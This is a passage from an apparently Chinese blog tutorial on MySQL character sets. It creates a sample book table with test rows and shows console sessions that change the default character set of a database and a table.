&#x51C6;&#x5907;&#x521B;&#x5EFA;&#x6D4B;&#x8BD5;&#x5E93;&#x548C;&#x8868;&#x7684;SQL&#x8BED;&#x53E5;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> testbookdb;</span><br><span class="line"><span class="comment">#CREATE DATABASE `testbookdb` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line"><span class="keyword">use</span> testbookdb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> book1 (bTypeId <span class="built_in">int</span>,bName <span class="built_in">char</span>(<span class="number">16</span>),price <span class="built_in">int</span>,publishing <span class="built_in">char</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;1&apos;</span>,<span class="string">&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;</span>,<span class="string">&apos;66&apos;</span>,<span class="string">&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;2&apos;</span>,<span class="string">&apos;&#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;&apos;</span>,<span class="string">&apos;68&apos;</span>,<span class="string">&apos;&#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;3&apos;</span>,<span class="string">&apos;&#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;&apos;</span>,<span class="string">&apos;90&apos;</span>,<span class="string">&apos;&#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;4&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;&apos;</span>,<span class="string">&apos;71&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;5&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B;&apos;</span>,<span class="string">&apos;72&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;6&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B;&apos;</span>,<span class="string">&apos;73&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;7&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B;&apos;</span>,<span class="string">&apos;74&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;8&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B;&apos;</span>,<span class="string">&apos;75&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;9&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B;&apos;</span>,<span class="string">&apos;76&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;10&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B;&apos;</span>,<span class="string">&apos;77&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;11&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B;&apos;</span>,<span class="string">&apos;78&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;12&apos;</span>,<span class="string">&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B;&apos;</span>,<span class="string">&apos;79&apos;</span>,<span class="string">&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> book1 (bTypeId <span class="built_in">int</span>,bName <span class="built_in">char</span>(<span class="number">16</span>),price <span class="built_in">int</span>,publishing <span class="built_in">char</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;1&apos;</span>,<span class="string">&apos;Linux&apos;</span>,<span class="string">&apos;66&apos;</span>,<span class="string">&apos;DZ&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;2&apos;</span>,<span class="string">&apos;CLD&apos;</span>,<span class="string">&apos;68&apos;</span>,<span class="string">&apos;RM&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;3&apos;</span>,<span class="string">&apos;OS&apos;</span>,<span class="string">&apos;90&apos;</span>,<span class="string">&apos;JX&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;4&apos;</span>,<span class="string">&apos;MySQL1&apos;</span>,<span class="string">&apos;71&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;5&apos;</span>,<span class="string">&apos;MySQL2&apos;</span>,<span class="string">&apos;72&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;6&apos;</span>,<span class="string">&apos;MySQL3&apos;</span>,<span class="string">&apos;73&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;7&apos;</span>,<span class="string">&apos;MySQL4&apos;</span>,<span class="string">&apos;74&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;8&apos;</span>,<span class="string">&apos;MySQL5&apos;</span>,<span class="string">&apos;75&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;9&apos;</span>,<span class="string">&apos;MySQL6&apos;</span>,<span class="string">&apos;76&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;10&apos;</span>,<span class="string">&apos;MySQL7&apos;</span>,<span class="string">&apos;77&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;11&apos;</span>,<span class="string">&apos;MySQL8&apos;</span>,<span class="string">&apos;78&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> book1(bTypeId,bName,price,publishing) <span class="keyword">VALUES</span>(<span class="string">&apos;12&apos;</span>,<span class="string">&apos;MySQL9&apos;</span>,<span class="string">&apos;79&apos;</span>,<span class="string">&apos;QH&apos;</span>);</span><br><span class="line"></span><br><span class="line">mysql&gt; create database book;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show create database book;</span><br><span class="line">+<span class="comment">----------+---------------------------------------------------------------+</span></span><br><span class="line">| Database | <span class="keyword">Create</span> <span class="keyword">Database</span>                                               |</span><br><span class="line">+<span class="comment">----------+---------------------------------------------------------------+</span></span><br><span class="line">| book     | <span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="string">`book`</span> <span class="comment">/*!40100 DEFAULT CHARACTER SET utf8 */</span> |</span><br><span class="line">+<span class="comment">----------+---------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">use</span> book;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16)) character set latin1;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; show CREATE TABLE book1;</span><br><span class="line">+<span class="comment">-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| Table | <span class="keyword">Create</span> <span class="keyword">Table</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|</span><br><span class="line">+<span class="comment">-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| book1 | <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`book1`</span> (</span><br><span class="line">&#xA0; <span class="string">`bTypeId`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`bName`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`price`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`publishing`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=latin1 |</span><br><span class="line">+<span class="comment">-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.02</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x4FEE;&#x6539;&#x6570;&#x636E;&#x5E93;&#x5B57;&#x7B26;&#x96C6;</strong><br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show create database book;</span><br><span class="line">+<span class="comment">----------+---------------------------------------------------------------+</span></span><br><span class="line">| Database | <span class="keyword">Create</span> <span class="keyword">Database</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">----------+---------------------------------------------------------------+</span></span><br><span class="line">| book&#xA0;&#xA0;&#xA0;&#xA0; | <span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="string">`book`</span> <span class="comment">/*!40100 DEFAULT CHARACTER SET utf8 */</span> |</span><br><span class="line">+<span class="comment">----------+---------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; <span class="keyword">alter</span> <span class="keyword">database</span> book <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> latin1;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; show create database book;</span><br><span class="line">+<span class="comment">----------+-----------------------------------------------------------------+</span></span><br><span class="line">| Database | <span class="keyword">Create</span> <span class="keyword">Database</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |</span><br><span class="line">+<span class="comment">----------+-----------------------------------------------------------------+</span></span><br><span class="line">| book&#xA0;&#xA0;&#xA0;&#xA0; | <span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="string">`book`</span> <span class="comment">/*!40100 DEFAULT CHARACTER SET latin1 */</span> |</span><br><span class="line">+<span class="comment">----------+-----------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x4FEE;&#x6539;&#x8868;&#x7684;&#x5B57;&#x7B26;&#x96C6;</strong><br> </p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show create table book1;</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| Table | <span class="keyword">Create</span> <span class="keyword">Table</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| book1 | <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`book1`</span> (</span><br><span class="line">&#xA0; <span class="string">`bTypeId`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`bName`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`price`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`publishing`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 |</span><br><span class="line">+<span class="comment">-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; <span class="keyword">alter</span> <span class="keyword">table</span> book1 <span class="keyword">default</span> <span class="built_in">character</span> <span class="keyword">set</span> latin1;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0&#xA0; Duplicates: 0&#xA0; Warnings: 0</span><br><span class="line"> </span><br><span class="line">mysql&gt; show create table book1;</span><br><span class="line">+<span class="comment">-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| Table | <span class="keyword">Create</span> <span class="keyword">Table</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|</span><br><span class="line">+<span class="comment">-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| book1 | <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`book1`</span> (</span><br><span class="line">&#xA0; <span class="string">`bTypeId`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`bName`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`price`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">&#xA0; <span class="string">`publishing`</span> <span class="built_in">char</span>(<span class="number">16</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">DEFAULT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=latin1 |</span><br><span class="line">+<span class="comment">-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x6DF1;&#x5165;&#x7814;&#x7A76;&#x5B57;&#x7B26;&#x96C6;&#xFF1A;</strong><br></p><figure class="highlight 